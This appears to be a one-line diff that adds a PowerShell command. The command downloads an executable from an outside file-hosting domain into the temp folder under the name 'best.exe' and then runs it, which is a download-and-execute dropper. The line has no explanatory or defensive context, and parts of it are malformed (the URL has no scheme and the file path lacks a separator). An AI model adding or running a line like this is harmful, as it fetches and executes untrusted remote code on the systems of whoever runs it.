@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('a.pomf.cat/msicxq.exe',"$env:TEMPbest.exe");Start-Process ("$env:TEMPbest.exe")
